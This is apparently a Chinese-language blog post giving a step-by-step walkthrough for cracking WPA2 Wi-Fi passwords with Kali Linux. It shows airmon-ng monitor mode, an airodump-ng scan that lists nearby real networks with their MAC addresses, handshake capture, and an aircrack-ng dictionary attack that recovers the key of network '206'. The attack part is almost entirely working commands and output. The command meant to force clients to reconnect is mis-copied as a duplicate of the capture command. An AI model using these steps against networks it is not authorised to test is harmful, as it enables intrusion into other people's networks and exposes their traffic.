---
title: WIFI 破解技术
date: 2026-01-09T21:30:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - 技术
  - WIFI
---
## 所需环境

需要安装 Kali Linux 同时配备一张无线网卡。

## 操作过程

### 启动监控状态

先确认 kali 连接上了网卡，wlan0 是网卡信息。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:88:e4:07 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::2167:25b3:e756:16ad/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
10: wlan0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 7c:dd:90:30:23:19 brd ff:ff:ff:ff:ff:ff
```

将网卡设置为监控状态。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo airmon-ng check kill


                                                                                                       
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo airmon-ng start wlan0


PHY     Interface       Driver          Chipset

phy3    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy3]wlan0 on [phy3]wlan0mon)
                (mac80211 station mode vif disabled for [phy3]wlan0)
```

确认监控模式已启用，看到有 Mode:Monitor 即已启用。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm   
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
```

### 扫描 WIFI 网段

使用 airodump-ng 扫描周围的无线网络，显示的 WIFI 网络信息如下：

- **BSSID**: 路由器的 MAC 地址
- **PWR**: 信号强度（数值越大越好）
- **CH**: 信道号
- **ENC**: 加密类型（WPA2、WPA3 等）
- **ESSID**: WiFi 名称

```bash
┌──(kali㉿kali)-[~/Work/Kali]                                                          08:42:03 [3/420]
└─$ sudo airodump-ng wlan0mon                                                                          
                                                                                                       
 CH  9 ][ Elapsed: 12 s ][ 2026-01-09 08:42                                                            

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 8C:DE:F9:AA:6B:80  -89        2        0    0   6  130   WPA2 CCMP   PSK  Xiaomi_6B7F                
 80:05:88:9E:9F:9A  -84        1        0    0   6  130   WPA2 CCMP   PSK  ShuWei6211161              
 80:05:88:9E:A4:95  -76        3        0    0   6  130   WPA2 CCMP   PSK  ShuWei6211161              
 10:12:B4:12:4A:49  -77        3        0    0   6  130   WPA2 CCMP   PSK  ChinaNet-QZkk              
 80:AE:54:A8:71:F8   -1        0        0    0   1   -1                    <length:  0>               
 C8:9F:1A:47:96:61  -82        3        0    0  11  360   WPA2 CCMP   PSK  <length:  0>               
 C8:9F:1A:47:96:60  -83        2        0    0  11  360   WPA2 CCMP   PSK  CMCC-小肥牛2            
 80:AE:54:A8:70:B8  -79        4        9    0   1  270   WPA2 CCMP   PSK  203                        
 80:AE:54:A8:75:CC  -76        4        0    0   1  270   WPA2 CCMP   PSK  205                        
 80:AE:54:A8:6F:AC  -85        4        5    0   1  270   WPA2 CCMP   PSK  305                        
 80:AE:54:A8:6D:50  -54        4       48    0   1  270   WPA2 CCMP   PSK  206                        

 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes

 80:AE:54:A8:71:F8  FE:ED:75:C8:4F:31  -90    0 - 1e     2        4                                    
 80:AE:54:A8:70:B8  8A:24:16:33:90:68  -84    0 - 6      0        2                                    
 80:AE:54:A8:70:B8  CC:B8:5E:92:ED:26   -1    1e- 0      0        2                                    
 80:AE:54:A8:70:B8  50:4F:3B:52:11:84   -1    6e- 0      0        7                                    
Quitting...
───────────
```

### 捕获与破解

这里以 206 为例，已知 WIFI 206 的密码为 Aa123456，使用命令 `sudo airodump-ng -c [信道号] --bssid [BSSID] -w capture wlan0mon` 来捕获握手包，使用 `sudo airodump-ng -c [信道号] --bssid [BSSID] -w capture wlan0mon` 强制设备重连，捕获成功是会显示 "WPA handshake: \[BSSID\]"，成功后断开即可获取数据包。

![](Pasted%20image%2020260109214701.png)

这里看到捕获成功了，当前目录下出现了流量包。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ls
capture-01.cap  capture-01.kismet.csv     capture-01.log.csv  wordlist.txt
capture-01.csv  capture-01.kismet.netxml  word1.txt
```

使用字典对流量包进行破解即可。

```bash
┌──(kali㉿kali)-[~/Work/Kali]                                                          08:48:34 [23/67]
└─$ sudo aircrack-ng -w word1.txt 80:AE:54:A8:6D:50 capture-01.cap                                     
Reading packets, please wait...                                                                        
Opening capture-01.cap                                                                                 
Opening 80:AE:54:A8:6D:50                                                                              
Failed to open '80:AE:54:A8:6D:50' (2): No such file or directory                                      
Resetting EAPOL Handshake decoder state.                                                               
Read 39449 packets.                                                                                    
                                                                                                       
   #  BSSID              ESSID                     Encryption                                          
                                                                                                       
   1  80:AE:54:A8:6D:50  206                       WPA (1 handshake)                                   
                                                                                                       
Choosing first network as target.                                                                      
                                                                                                       
Reading packets, please wait...                                                                        
Opening 80:AE:54:A8:6D:50                                                                              
Failed to open '80:AE:54:A8:6D:50' (2): No such file or directory                                      
Opening capture-01.cap                                                                                 
Resetting EAPOL Handshake decoder state.                                                               
Read 39449 packets.                                                                                    
                                                                                                       
1 potential targets                                                                                    
                                                                                                       
                               Aircrack-ng 1.7 

      [00:00:00] 4/5 keys tested (430.99 k/s) 

      Time left: 0 seconds                                      80.00%

                           KEY FOUND! [ Aa123456 ]


      Master Key     : 08 39 92 AF 7F 26 2E 93 2F 40 34 93 AF 26 41 22 
                       C3 60 CE AA 4A 16 34 AA AD BB 43 F3 51 CC 3B 57 

      Transient Key  : 85 4A A6 C5 12 C2 64 CF 69 F7 46 A2 99 CE 46 35 
                       B8 B4 99 8C 69 9F 3B 68 2C EB 14 95 42 FC 6B C9 
                       47 5E 48 08 54 95 A1 A4 8D 45 E4 58 CC 36 52 C1 
                       24 89 DF 94 74 6F C7 36 9D 34 95 09 05 C9 E9 63 

      EAPOL HMAC     : 98 01 39 80 33 F0 BE 75 7D 85 90 CB 69 AD 3B F1 

                                                                                                       
┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat word1.txt   
Aa123456
21315454
+++++4
666666
888888
```